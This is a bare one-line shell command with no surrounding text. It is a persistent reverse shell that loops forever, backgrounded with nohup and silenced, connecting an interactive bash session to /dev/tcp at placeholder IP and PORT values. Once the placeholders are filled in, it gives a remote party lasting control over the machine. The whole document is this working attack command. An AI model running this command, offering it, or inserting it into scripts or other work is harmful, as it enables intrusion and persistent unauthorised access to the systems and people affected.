(nohup bash -c \"while true;do bash -i >& /dev/tcp/IP/PORT 0>&1 2>&1; sleep 1;done\" 1>/dev/null &)
